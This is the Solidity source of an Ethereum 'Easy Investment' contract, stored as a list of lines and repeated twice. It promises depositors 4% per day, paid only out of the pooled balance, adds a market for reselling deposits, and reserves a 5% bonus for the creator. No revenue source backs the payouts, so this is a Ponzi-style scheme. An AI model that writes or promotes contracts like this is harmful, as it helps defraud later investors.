['/**\n', ' *\n', ' * Easy Investment Contract version 2.0\n', ' * It is a copy of original Easy Investment Contract\n', ' * But here a unique functions is added\n', ' * \n', ' * For the first time you can sell your deposit to another user!!!\n', ' * \n', ' */\n', 'pragma solidity ^0.4.24;\n', '\n', 'contract EasyStockExchange {\n', '    mapping (address => uint256) invested;\n', '    mapping (address => uint256) atBlock;\n', '    mapping (address => uint256) forSale;\n', '    mapping (address => bool) isSale;\n', '    \n', '    address creator;\n', '    bool paidBonus;\n', '    uint256 success = 1000 ether;\n', '    \n', '    event Deals(address indexed _seller, address indexed _buyer, uint256 _amount);\n', '    event Profit(address indexed _to, uint256 _amount);\n', '    \n', '    constructor () public {\n', '        creator = msg.sender;\n', '        paidBonus = false;\n', '    }\n', '\n', '    modifier onlyOnce () {\n', '        require (msg.sender == creator,"Access denied.");\n', '        require(paidBonus == false,"onlyOnce.");\n', '        require(address(this).balance > success,"It is too early.");\n', '        _;\n', '        paidBonus = true;\n', '    }\n', '\n', '    // this function called every time anyone sends a transaction to this contract\n', '    function () external payable {\n', '        // if sender (aka YOU) is invested more than 0 ether\n', '        if (invested[msg.sender] != 0) {\n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '\n', '            // send calculated amount of ether directly to sender (aka YOU)\n', '            address sender = msg.sender;\n', '            sender.transfer(amount);\n', '            emit Profit(sender, amount);\n', '        }\n', '\n', '        // record block number and invested amount (msg.value) of this transaction\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += msg.value;\n', '    }\n', '    \n', '    \n', '    /**\n', '     * function add your deposit to the exchange\n', '     * fee from a deals is 10% only if success\n', '     * fee funds is adding to main contract balance\n', '     */\n', '    function startSaleDepo (uint256 _salePrice) public {\n', '        require (invested[msg.sender] > 0,"You have not deposit for sale.");\n', '        forSale[msg.sender] = _salePrice;\n', '        isSale[msg.sender] = true;\n', '    }\n', '\n', '    /**\n', '     * function remove your deposit from the exchange\n', '     */    \n', '    function stopSaleDepo () public {\n', '        require (isSale[msg.sender] == true,"You have not deposit for sale.");\n', '        isSale[msg.sender] = false;\n', '    }\n', '    \n', '    /**\n', '     * function buying deposit \n', '     */\n', '    function buyDepo (address _depo) public payable {\n', '        require (isSale[_depo] == true,"So sorry, but this deposit is not for sale.");\n', '        isSale[_depo] = false; // lock reentrance\n', '\n', '        require (forSale[_depo] == msg.value,"Summ for buying deposit is incorrect.");\n', '        address seller = _depo;\n', '        \n', '        \n', '        //keep the accrued interest of sold deposit\n', '        uint256 amount = invested[_depo] * 4 / 100 * (block.number - atBlock[_depo]) / 5900;\n', '        invested[_depo] += amount;\n', '\n', '\n', '        //keep the accrued interest of buyer deposit\n', '        if (invested[msg.sender] > 0) {\n', '            amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '            invested[msg.sender] += amount;\n', '        }\n', '        \n', '        // change owner deposit\n', '        invested[msg.sender] += invested[_depo];\n', '        atBlock[msg.sender] = block.number;\n', '\n', '        \n', '        invested[_depo] = 0;\n', '        atBlock[_depo] = block.number;\n', '\n', '        \n', '        isSale[_depo] = false;\n', '        seller.transfer(msg.value * 9 / 10); //10% is fee for deal. This funds is stay at main contract\n', '        emit Deals(_depo, msg.sender, msg.value);\n', '    }\n', '    \n', '    function showDeposit(address _depo) public view returns(uint256) {\n', '        return invested[_depo];\n', '    }\n', '\n', '    function showUnpaidDepositPercent(address _depo) public view returns(uint256) {\n', '        return invested[_depo] * 4 / 100 * (block.number - atBlock[_depo]) / 5900;\n', '    }\n', '    \n', '    function Success () public onlyOnce {\n', '        // bonus 5% to creator for successful project\n', '        creator.transfer(address(this).balance / 20);\n', '\n', '    }\n', '}']
['/**\n', ' *\n', ' * Easy Investment Contract version 2.0\n', ' * It is a copy of original Easy Investment Contract\n', ' * But here a unique functions is added\n', ' * \n', ' * For the first time you can sell your deposit to another user!!!\n', ' * \n', ' */\n', 'pragma solidity ^0.4.24;\n', '\n', 'contract EasyStockExchange {\n', '    mapping (address => uint256) invested;\n', '    mapping (address => uint256) atBlock;\n', '    mapping (address => uint256) forSale;\n', '    mapping (address => bool) isSale;\n', '    \n', '    address creator;\n', '    bool paidBonus;\n', '    uint256 success = 1000 ether;\n', '    \n', '    event Deals(address indexed _seller, address indexed _buyer, uint256 _amount);\n', '    event Profit(address indexed _to, uint256 _amount);\n', '    \n', '    constructor () public {\n', '        creator = msg.sender;\n', '        paidBonus = false;\n', '    }\n', '\n', '    modifier onlyOnce () {\n', '        require (msg.sender == creator,"Access denied.");\n', '        require(paidBonus == false,"onlyOnce.");\n', '        require(address(this).balance > success,"It is too early.");\n', '        _;\n', '        paidBonus = true;\n', '    }\n', '\n', '    // this function called every time anyone sends a transaction to this contract\n', '    function () external payable {\n', '        // if sender (aka YOU) is invested more than 0 ether\n', '        if (invested[msg.sender] != 0) {\n', '            // calculate profit amount as such:\n', '            // amount = (amount invested) * 4% * (blocks since last transaction) / 5900\n', '            // 5900 is an average block count per day produced by Ethereum blockchain\n', '            uint256 amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '\n', '            // send calculated amount of ether directly to sender (aka YOU)\n', '            address sender = msg.sender;\n', '            sender.transfer(amount);\n', '            emit Profit(sender, amount);\n', '        }\n', '\n', '        // record block number and invested amount (msg.value) of this transaction\n', '        atBlock[msg.sender] = block.number;\n', '        invested[msg.sender] += msg.value;\n', '    }\n', '    \n', '    \n', '    /**\n', '     * function add your deposit to the exchange\n', '     * fee from a deals is 10% only if success\n', '     * fee funds is adding to main contract balance\n', '     */\n', '    function startSaleDepo (uint256 _salePrice) public {\n', '        require (invested[msg.sender] > 0,"You have not deposit for sale.");\n', '        forSale[msg.sender] = _salePrice;\n', '        isSale[msg.sender] = true;\n', '    }\n', '\n', '    /**\n', '     * function remove your deposit from the exchange\n', '     */    \n', '    function stopSaleDepo () public {\n', '        require (isSale[msg.sender] == true,"You have not deposit for sale.");\n', '        isSale[msg.sender] = false;\n', '    }\n', '    \n', '    /**\n', '     * function buying deposit \n', '     */\n', '    function buyDepo (address _depo) public payable {\n', '        require (isSale[_depo] == true,"So sorry, but this deposit is not for sale.");\n', '        isSale[_depo] = false; // lock reentrance\n', '\n', '        require (forSale[_depo] == msg.value,"Summ for buying deposit is incorrect.");\n', '        address seller = _depo;\n', '        \n', '        \n', '        //keep the accrued interest of sold deposit\n', '        uint256 amount = invested[_depo] * 4 / 100 * (block.number - atBlock[_depo]) / 5900;\n', '        invested[_depo] += amount;\n', '\n', '\n', '        //keep the accrued interest of buyer deposit\n', '        if (invested[msg.sender] > 0) {\n', '            amount = invested[msg.sender] * 4 / 100 * (block.number - atBlock[msg.sender]) / 5900;\n', '            invested[msg.sender] += amount;\n', '        }\n', '        \n', '        // change owner deposit\n', '        invested[msg.sender] += invested[_depo];\n', '        atBlock[msg.sender] = block.number;\n', '\n', '        \n', '        invested[_depo] = 0;\n', '        atBlock[_depo] = block.number;\n', '\n', '        \n', '        isSale[_depo] = false;\n', '        seller.transfer(msg.value * 9 / 10); //10% is fee for deal. This funds is stay at main contract\n', '        emit Deals(_depo, msg.sender, msg.value);\n', '    }\n', '    \n', '    function showDeposit(address _depo) public view returns(uint256) {\n', '        return invested[_depo];\n', '    }\n', '\n', '    function showUnpaidDepositPercent(address _depo) public view returns(uint256) {\n', '        return invested[_depo] * 4 / 100 * (block.number - atBlock[_depo]) / 5900;\n', '    }\n', '    \n', '    function Success () public onlyOnce {\n', '        // bonus 5% to creator for successful project\n', '        creator.transfer(address(this).balance / 20);\n', '\n', '    }\n', '}']
